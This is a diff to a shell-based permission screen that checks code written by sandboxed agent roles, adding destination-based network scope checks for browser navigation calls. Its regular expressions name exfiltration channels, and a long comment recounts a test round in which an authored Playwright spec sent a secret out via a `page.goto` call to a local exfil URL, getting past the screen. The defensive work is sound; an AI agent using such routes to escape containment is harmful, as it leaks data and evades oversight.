@@ -727,7 +727,9 @@ $(printf '%s' "$code" | perl -0777 -pe 's{/\*.*?\*/}{ }gs; s{(^|[^:"\x27\\])//[^
     CAP_ID='process'; CAP_WHAT='a worker thread (worker_threads) — a worker does NOT inherit the runtime permission profile, so it is a way out of the containment that profile installs'
   elif printf '%s' "$CODE_N" | grep -Eq "${LOAD}[[:space:]]*\([[:space:]]*\"[[:space:]]*(net|http|https|dgram|tls|dns|inspector)[[:space:]]*\"|from[[:space:]]*\"[[:space:]]*(net|http|https|dgram)[[:space:]]*\"|^[[:space:]]*import[[:space:]]+(socket|urllib|requests|httpx|ftplib|smtplib|telnetlib)([[:space:],.]|$)|^[[:space:]]*from[[:space:]]+(socket|urllib|requests|httpx)([[:space:].]|$)|\bfetch[[:space:]]*\(|XMLHttpRequest|WebSocket[[:space:]]*\("; then
     CAP_ID='network'; CAP_WHAT='raw network access (net / http / socket / fetch …) — an exfiltration channel'
-  elif printf '%s' "$CODE_N" | grep -Eq "\b(request|apiRequest|context)\.(get|post|put|patch|delete|fetch|head)[[:space:]]*\([[:space:]]*[\"'\`]?[a-zA-Z][a-zA-Z0-9+.-]*://|\bsendBeacon[[:space:]]*\(|\bnavigator\.sendBeacon\b"; then
+  elif printf '%s' "$CODE_N" | grep -Eq "\b(request|apiRequest|context)\.(get|post|put|patch|delete|fetch|head)[[:space:]]*\([[:space:]]*[\"'\`]?[a-zA-Z][a-zA-Z0-9+.-]*://|\bsendBeacon[[:space:]]*\(|\bnavigator\.sendBeacon\b" \
+       && ! harness_os_code_calls_in_scope "$CODE_N" "$(harness_os_role_field "$ROLE" '.network.allow')" \
+            "\.(get|post|put|patch|delete|fetch|head)"; then
     # The test framework's OWN http client is the natural exfiltration
     # primitive in a test-authoring role: `request` is a standard
     # Playwright fixture and `request.get(url)` reaches any host. An axis
@@ -768,6 +770,99 @@ $(printf '%s' "$code" | perl -0777 -pe 's{/\*.*?\*/}{ }gs; s{(^|[^:"\x27\\])//[^
   # only the three-slash form missed the shortest spelling of it.
   if [ -z "$CAP_ID" ] && printf '%s' "$CODE_N" | grep -Eq 'file:/'; then
     CAP_ID='fs'; CAP_WHAT='a file: URL — the browser/runtime reads the path directly, with no host module for a scope check to see'
+  fi
+  # AUTHORED NAVIGATION, HELD TO THE NETWORK SCOPE.
+  #
+  # Round 33 built `network.allow` and wrote that "who a command talks to
+  # was not modelled at all". Rounds 34-36 carried it to curl's override
+  # flags, to WebFetch and to the MCP arm. It never reached the browser
+  # that a granted test runner drives — and for a Playwright role that is
+  # the channel, not an edge case.
+  #
+  # Round 38 wrote a spec whose whole body was
+  #
+  #     await page.goto("http://127.0.0.1:9999/exfil?d=" + secret)
+  #
+  # authored it inside the composer's own write scope, ran it with the
+  # composer's own `npx playwright test`, and chromium made the request.
+  # Both steps ALLOW. External egress, SSRF to any local port, and the
+  # role's in-scope context on the wire — the three capabilities the
+  # network axis exists to stop.
+  #
+  # The screen HAD `page.goto` in view: round 32 taught it to refuse
+  # `page.goto("file://…")` as a local read. It modelled goto→file and
+  # missed goto→network while an entire network axis was being built for
+  # every other channel. That is this document's most-repeated defect
+  # with the two halves of one call as the two channels.
+  #
+  # And the reviewer's other half is the sharper one. The exfil branches
+  # above are destination-BLIND and total, so a composer authoring
+  # `request.get("http://localhost:4173/api")` — a fetch of its OWN
+  # in-scope app — is refused as "an exfiltration channel", while
+  # `page.goto("http://127.0.0.1:9999")` to a genuinely forbidden host
+  # was allowed. The check that fired was the one that should not have,
+  # and the one that should was absent.
+  #
+  # So for a role that declares a network scope, a network call is judged
+  # by its DESTINATION rather than by its existence: a literal URL is
+  # parsed and scope-checked like any other, and a destination built at
+  # run time is refused, which is round 20's inversion (prove it inert;
+  # do not guess at it) applied to a host instead of a path. A role with
+  # no declared scope keeps the old blanket behaviour, because there is
+  # nothing to check against.
+  if [ -z "$CAP_ID" ]; then
+    local nav_scope nav_call nav_arg nav_lit nav_auth
+    nav_scope=$(harness_os_role_field "$ROLE" '.network.allow')
+    while IFS= read -r nav_call; do
+      [ -n "$nav_call" ] || continue
+      nav_arg="${nav_call#*(}"
+      nav_arg=$(printf '%s' "$nav_arg" | sed -E 's/^[[:space:]]+//; s/[[:space:]]*[,)].*$//')
+      case "$nav_arg" in
+        \"*\") nav_lit="${nav_arg%\"}"; nav_lit="${nav_lit#\"}"
+               # A quote surviving inside is a concatenation, not a
+               # literal: `"http://" + host + "/x"` starts and ends with
+               # a quote and names no host at all. The framework-file-API
+               # branch has made this same test since round 20.
+               case "$nav_lit" in *\"*) nav_lit="" ;; esac ;;
+        \'*\') nav_lit="${nav_arg%\'}"; nav_lit="${nav_lit#\'}"
+               case "$nav_lit" in *\'*) nav_lit="" ;; esac ;;
+        *) nav_lit="" ;;
+      esac
+      case "$nav_lit" in *'${'*|*'`'*) nav_lit="" ;; esac
+      # A relative path is a navigation against the framework's own
+      # baseURL, which is the app under test — not a destination this
+      # kernel can or should second-guess.
+      case "$nav_lit" in /*|'#'*|'?'*) continue ;; esac
+      # An empty operand is a call with no destination argument at all
+      # (`context.request()`), not a hidden one.
+      case "$nav_arg" in '') continue ;; esac
+      if [ -z "$nav_lit" ]; then
+        # A destination built at run time cannot be scoped — round 20's
+        # inversion, applied to a host instead of a path. But it is
+        # refused only where a scope was DECLARED: `navigateTo(url)` with
+        # `url = process.env.APP_URL || '/forms'` is an ordinary spec
+        # idiom, and a role whose manifest says nothing about
+        # destinations has not asked for it to be checked. Declaring
+        # `network.allow` is the statement that connections matter here,
+        # and it is what turns an unverifiable destination into a
+        # refusal.
+        [ "$nav_scope" = "null" ] && continue
+        CAP_ID='network'; CAP_WHAT="a browser navigation whose destination is built at run time ('$nav_arg') — a host assembled from expressions cannot be checked against this role's network scope, and the browser dials it directly with no host module for a scope check to see"
+        break
+      fi
+      harness_os_is_network_url "$nav_lit" || continue
+      nav_auth=$(harness_os_url_authority "$nav_lit")
+      [ -n "$nav_auth" ] || continue
+      if [ "$nav_scope" = "null" ]; then
+        CAP_ID='network'; CAP_WHAT="a browser navigation to '$nav_auth' — this role declares no network scope, so no destination can be shown to be permitted"
+        break
+      fi
+      if ! harness_os_authority_in_scope "$nav_auth" "$nav_scope"; then
+        CAP_ID='network'; CAP_WHAT="a browser navigation to '$nav_auth', which is outside this role's network scope ($(printf '%s' "$nav_scope" | "$JQ" -r 'join(", ")' 2>/dev/null))"
+        break
+      fi
+    done < <(printf '%s' "$CODE_N" \
+      | grep -oE "\.(goto|navigateTo|navigate|open|setExtraHTTPHeaders)[[:space:]]*\([^)]*\)?|\b(request|apiRequest|context)\.(get|post|put|patch|delete|fetch|head)[[:space:]]*\([^)]*\)?" 2>/dev/null)
   fi
   # CONFIGURATION THAT IS A COMMAND. Round 25's finding, and the one
   # that says the most about what this screen is: every branch above
